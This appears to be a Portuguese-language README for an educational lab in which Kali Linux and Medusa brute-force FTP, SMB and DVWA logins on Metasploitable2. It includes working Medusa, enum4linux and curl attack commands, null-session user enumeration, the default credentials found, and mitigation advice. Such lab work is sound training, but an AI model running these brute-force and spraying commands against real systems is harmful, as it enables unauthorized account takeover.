# Brute Force Lab — Medusa + Metasploitable2 + DVWA

Projeto prático de simulação de ataques de força bruta em ambiente controlado, utilizando Kali Linux e Medusa contra serviços vulneráveis do Metasploitable2 e do DVWA (Damn Vulnerable Web App).

> Projeto feito exclusivamente em laboratório isolado (rede host-only), para fins educacionais. Nenhuma técnica aqui deve ser aplicada contra sistemas sem autorização explícita.

## Objetivo

Compreender e demonstrar na prática ataques de força bruta em diferentes serviços (FTP, SMB, formulário web), utilizando o Kali Linux e a ferramenta Medusa, e propor medidas de mitigação para cada vulnerabilidade explorada.

## Ambiente de Laboratório

| Máquina | IP | Função |
|---|---|---|
| Kali Linux | 10.0.2.15 | Atacante |
| Metasploitable2 | 10.0.2.3 | Alvo vulnerável |

Rede configurada em modo Host-only no VirtualBox, isolando o laboratório da rede externa.

## Reconhecimento (Nmap)

```bash
nmap -sV -p- 10.0.2.3
```

Principais portas relevantes para o teste:

```
21/tcp    open  ftp         vsftpd 2.3.4
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)   -> DVWA
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Ver `images/01-nmap-scan.png`.

## Construção das Wordlists

Para equilibrar realismo e tempo de execução, foram criadas duas wordlists próprias (`lowusers.txt` e `lowsenhas.txt`), combinando:

1. Uma amostra reduzida (100-200 linhas) de uma wordlist pública de domínio aberto ([duyet/bruteforce-database](https://github.com/duyet/bruteforce-database))
2. Credenciais padrão conhecidas e publicamente documentadas do Metasploitable2 (ex: `msfadmin`, `user`, `postgres`, `service`), inseridas no meio do arquivo (não apenas no início/fim)
3. Remoção de duplicatas mantendo a ordem original (`awk '!seen[$0]++'`)

```bash
head -n 150 <wordlist-origem> > senhas-amostra.txt
split -n l/2 senhas-amostra.txt parte_
cat parte_aa <(echo -e "msfadmin\nuser\npostgres\nservice\n123456\npassword") parte_ab > lowsenhas.txt
awk '!seen[$0]++' lowsenhas.txt > lowsenhas-final.txt
```

Resultado: `lowusers.txt` (54 entradas) e `lowsenhas.txt` (156 entradas), com as credenciais conhecidas verificadamente posicionadas no meio dos arquivos (ex: `msfadmin` na linha 26 de 54, e na linha 76 de 156).

Arquivos em [`wordlists/`](./wordlists).

## Ataque 1 — FTP (Medusa)

```bash
medusa -h 10.0.2.3 -U wordlists/lowusers.txt -P wordlists/lowsenhas.txt -M ftp -t 10 | tee wordlists/ftp-output-full.txt | grep "SUCCESS"
```

Resultado:

```
ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: user Password: user [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: postgres Password: postgres [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: service Password: service [SUCCESS]
```

Quatro contas com credenciais fracas/padrão identificadas no serviço FTP.

Validação manual:

```bash
ftp 10.0.2.3
```

Login confirmado com `msfadmin:msfadmin`, com acesso de leitura ao diretório remoto (`ls` retornando conteúdo real).

Ver `images/04-ftp-medusa-ataque.png`, `images/05-ftp-account-found.png` e `images/06-ftp-login-manual.png`.

## Ataque 2 — SMB (Enumeração + Password Spraying)

### Enumeração de usuários (null session)

```bash
enum4linux -U 10.0.2.3
```

A Samba do alvo permitiu sessão nula (`username ''`, `password ''`), expondo a lista completa de usuários do sistema sem autenticação — uma falha de configuração relevante.

```bash
grep "user:\[" enum4linux-output.txt | awk -F'[][]' '{print $2}' > wordlists/smb-users.txt
```

Ver `images/07-smb-enum4linux.png`.

### Password Spraying

Com a lista real de usuários extraída, aplicou-se password spraying (poucas senhas comuns testadas contra todos os usuários, ao invés de muitas senhas por usuário — abordagem que reduz o risco de lockout de conta):

```bash
medusa -h 10.0.2.3 -U wordlists/smb-users.txt -P wordlists/smb-passwords-spray.txt -M smbnt
```

Resultado:

```
ACCOUNT FOUND: [smbnt] Host: 10.0.2.3 User: user Password: user [SUCCESS (ADMIN$ - Access Allowed)]
ACCOUNT FOUND: [smbnt] Host: 10.0.2.3 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

Ver `images/08-smb-medusa-spray.png`.

Validação manual:

```bash
smbclient //10.0.2.3/ADMIN$ -U msfadmin
```

A autenticação foi aceita, mas o compartilhamento `ADMIN$` negou a listagem de arquivos (`NT_STATUS_NETWORK_ACCESS_DENIED`) — uma distinção importante entre autenticação válida e autorização de acesso ao recurso. Testando o mesmo usuário contra o compartilhamento `tmp`, o acesso e a listagem de arquivos foram concedidos normalmente, confirmando a validade da credencial:

```bash
smbclient //10.0.2.3/tmp -U msfadmin
```

Ver `images/09-smb-login-manual.png`.

## Ataque 3 — DVWA (Login Web)

### Reconhecimento do formulário

```bash
curl -s http://10.0.2.3/dvwa/login.php
```

Campos identificados: `username`, `password`, botão `Login`. Sem token CSRF (`user_token`) presente no formulário. A própria tela de login expõe a dica "default username is 'admin' with password 'password'", uma informação sensível desnecessariamente exposta.

Ver `images/11-dvwa-form-html.png`.

### Tentativa com Medusa (módulo web-form)

```bash
medusa -h 10.0.2.3 -u admin -P wordlists/lowsenhas.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"post?username=&password=&Login=Login" \
  -m CUSTOM-HEADER:"Cookie: PHPSESSID=<valor>; security=high"
```

O ataque retornou consistentemente erro HTTP 302 em todas as tentativas (`error code 302`), sem conseguir avaliar nenhuma credencial.

Ver `images/13-dvwa-medusa-erro302.png`.

### Diagnóstico da limitação

Para identificar a causa raiz, o comportamento do servidor foi testado manualmente com `curl`, mantendo um cookie de sessão entre requisições (cookie jar):

```bash
curl -s -c cookies.txt http://10.0.2.3/dvwa/login.php -o /dev/null

curl -s -i -b cookies.txt -c cookies.txt -X POST http://10.0.2.3/dvwa/login.php \
  -d "username=admin&password=senhaerrada&Login=Login" | grep -i "location\|http"

curl -s -i -b cookies.txt -c cookies.txt -X POST http://10.0.2.3/dvwa/login.php \
  -d "username=admin&password=password&Login=Login" | grep -i "location\|http"
```

Resultado:

```
HTTP/1.1 302 Found
Location: login.php      (senha incorreta)

HTTP/1.1 302 Found
Location: index.php      (senha correta)
```

O DVWA sempre responde com HTTP 302 (padrão Post-Redirect-Get), nunca com HTTP 200 nessa rota. A diferença entre sucesso e falha está no cabeçalho `Location`, não no corpo da resposta. O módulo `web-form` do Medusa foi projetado para identificar sucesso/falha a partir de texto no corpo de uma resposta HTTP 200, o que explica por que ele falha de forma estrutural diante desse comportamento do DVWA — não se trata de erro de configuração do comando, mas de uma limitação da ferramenta diante desse padrão de aplicação web.

Ver `images/12-dvwa-curl-diagnostico.png`.

### Script próprio como alternativa

Diante da limitação identificada, foi desenvolvido um script em Bash que reutiliza cookie de sessão corretamente entre tentativas e identifica sucesso pelo cabeçalho `Location`, reproduzindo a lógica de força bruta que o Medusa não conseguiu executar nesse cenário:

```bash
./brute-dvwa.sh
```

Código completo em [`brute-dvwa.sh`](./brute-dvwa.sh).

Resultado:

```
[+] CREDENCIAL ENCONTRADA: admin:password
```

A credencial `admin:password` confirma a dica previamente observada na própria tela de login.

Ver `images/14-dvwa-script-sucesso.png` e `images/15-dvwa-painel-logado.png`.

## Recomendações de Mitigação

| Vulnerabilidade | Recomendação |
|---|---|
| FTP com credenciais fracas/padrão | Desabilitar logins padrão, aplicar política de senha forte, usar SFTP/FTPS |
| Samba permitindo sessão nula | Desabilitar null session (`restrict anonymous = 2`), aplicar auditoria de enumeração |
| Senhas reutilizadas/fracas no SMB | Política de senha forte, MFA, bloqueio de conta após tentativas falhas |
| Credenciais padrão expostas na tela de login do DVWA | Remover dicas de credenciais em produção, implementar rate limiting e CAPTCHA |
| Falta de lockout de conta em geral | Implementar bloqueio temporário após N tentativas falhas, monitoramento via SIEM/IDS |

## Evidências

Ver pasta [`/images`](./images) — prints dos comandos, outputs do Medusa e validações manuais.

## Aprendizados

Este projeto reforçou a diferença entre executar um ataque e realmente entendê-lo. O momento mais relevante do laboratório não foi encontrar as credenciais em si, mas diagnosticar por que o Medusa falhava no ataque ao DVWA: em vez de assumir erro de configuração, investigar o comportamento real do servidor com curl permitiu identificar que a limitação era estrutural (o DVWA nunca retorna HTTP 200 na rota de login, só 302), não um problema no comando.

Isso também mostrou a importância de saber quando uma ferramenta não é adequada para um cenário específico e como contornar isso de forma técnica — desenvolver o script em Bash não foi abandonar o Medusa, mas complementar sua limitação com uma solução direcionada ao problema identificado.

Outro ponto de destaque foi a enumeração via SMB: a sessão nula aceita pelo Samba do Metasploitable2 demonstrou como uma falha de configuração aparentemente simples pode expandir drasticamente a superfície de ataque, ao fornecer usuários reais para o password spraying em vez de depender de uma wordlist genérica.

Por fim, o projeto evidenciou a importância de credenciais padrão/fracas como vetor de ataque recorrente — em todos os três serviços testados (FTP, SMB, DVWA), o acesso foi obtido através de credenciais previsíveis, reforçando que a mitigação mais simples e eficaz nesses casos é a política básica de senha forte e a remoção de contas/credenciais padrão em ambientes de produção.
